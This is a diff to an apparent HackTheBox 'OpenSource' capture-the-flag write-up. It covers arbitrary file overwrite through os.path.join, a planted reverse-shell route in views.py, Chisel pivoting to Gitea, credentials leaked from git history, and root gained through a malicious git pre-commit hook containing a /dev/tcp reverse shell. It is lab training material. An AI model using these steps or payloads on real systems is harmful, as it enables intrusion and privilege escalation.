@@ -150,10 +150,12 @@ It is using our filename for crafting the path to the file, but if the filename 
 >>> os.path.join("test","test2","/file.txt")
 '/file.txt'
 ```
-It basically means, that if we name our file "/etc/passwd", it wouldn't end up in the "/app/public/uploads/etc/passwd" directory, but would end up overwriting the original "/etc/passwd" file. **Bingo!** 
+It basically means, that if we name our file "/etc/passwd", it wouldn't end up in the "/app/public/uploads/etc/passwd" directory, but would end up overwriting the original "/etc/passwd" file. **Bingo!**
 
-In source code that we just downloaded we can see that the directory with [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py) is in /app/app/ directory. If we modify [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py), and name it "/app/app/views.py" it would overwrite the original [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py) file and we would be able to execute our own python code. I modified the [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py) file so it contains another route at '/revshell/<ip>' that will execute reverse shell after visiting this endpoint with my browser.
 
+In source code that we just downloaded we can see that the directory with [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py) is in /app/app/ directory.If we modify [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py), and name it "/app/app/views.py" it would overwrite the original [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py) file and we would be able to execute our own python code. I modified the [views.py](https://github.com/mateusz7988/CTF-Writeups/blob/main/HackTheBox/OpenSource/views.py) file so it contains another route at "/revshell/\<ip\>"
+that will execute reverse shell after visiting this endpoint with my browser.
+    
 ```python
 import os
 
@@ -198,7 +200,44 @@ def revshell(ip):
     import pty
     pty.spawn("sh")
 ```
-    
- 
+Now I set up a netcat listener with `nc -lvnp 1337` and I visited the "/revshell/\<ip\>" endpoint with my actual ip. **Hoorah!** We just got ourselves access to a docker container!
+Well, now comes the tricky part. We knew before that there was some kind of service running on port 3000 - probably Gitea, as this is its default HTTP listening port. To get access to Gitea, we will need to do some pivoting. When doing this CTF, I stumbled upon **_Chisel_**. This is the tool that establishes fast TCP/UDP tunnel, transported over HTTP and secured via SSH. You can visit **Chisel** github page [here](https://github.com/jpillora/chisel). 
+Now, I uploaded the **Chisel** to the docker container and set up a **Chisel** server on my localhost using command: `chipsel server --reverse -p 8001`. Then, I used **Chisel** on discord as a client, using this command: `chipsel client \<ip\>:\<port\> R:socks`. Now, the only thing that I needed was to set up my browser proxy to proxy all the network traffic through port 1080 (default port used by Chisel). I did it with FoxyProxy add-on, by using settings like: Proxy Type = SOCKS5, Proxy IP = 127.0.0.1, Port = 1080. **Voila!** Now we have access to Gitea!
+
+We know that private IPv4 of compromised docker container is 172.17.0.1. If we search for "http://172.17.0.1:3000" in browser, we will be greeted with Gitea login screen. Huh... But how do we log in?
+
+If we check the folder, where we downloaded the source code of vulnerable app, we can see that it contains also .git directory. After playing a while with git commands, I was able to find the _dev_ branch and switched to it by using `git checkout dev`. Now after using `git log` and inspecting each log with `git show \<id of commit\>`, I found some hardcoded credentials - dev01:Soulless_Developer#2022
+
+After using these credential to log into Gitea, we are able to find private ssh key of dev01. Now the only thing to do is to copy this key and to use our `ssh` command with `-i` flag to log in using the copied key stored in a file id_rsa:
+`sudo ssh -i id_rsa dev01@10.10.11.164`
+
+After this long journey, we are able to finally submit the **_user.txt_** flag.
+
+As in most of the CTF's, I check for SUID bits, uploaded linpeas.sh, yada yada yada... But it didn't help much. After inspecting some background processes using **pspy64** we can notice that there is a binary running every minute called "_/usr/local/bin/git-sync_". This is its source code:
+```bash
+#!/bin/bash
+
+cd /home/dev01/
+
+if ! git status --porcelain; then
+    echo "No changes"
+else
+    day=$(date +'%Y-%m-%d')
+    echo "Changes detected, pushing.."
+    git add .
+    git commit -m "Backup for ${day}"
+    git push origin main
+fi
+```
+This script executes every minute and it basically checks for changes in /home/dev01/. If there are some changes, it executes a bunch of git commands such as: `git add`, `git commit`, etc.
+Knowing this, we can make a malicious git hook that will execute our commands every time, there is a `git commit` command executed. The name of my hook was "**pre-commit**" and it contained this code:
+
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/\<my_ip\>/\<my_port\> 0>&1
+```
+Then I set up a netcat listener on my localhost using command `nc -lvnp 6969` and modified the home directory of dev01 user by adding some non-empty files with command `echo "I don't know what I'm doing" > test.txt`. After couple of seconds, I got a reverse shell with root privileges and was able to retrieve the **_root.txt_** flag.
+
+This box was actually really fun and I needed to access tutorials to deal with some of the parts, but at the same time I learned a lot of new things. I am really glad that I bought HackTheBox Vip membership and I can't wait to make more writeups in the future! See you soon choombas! :)
     
 
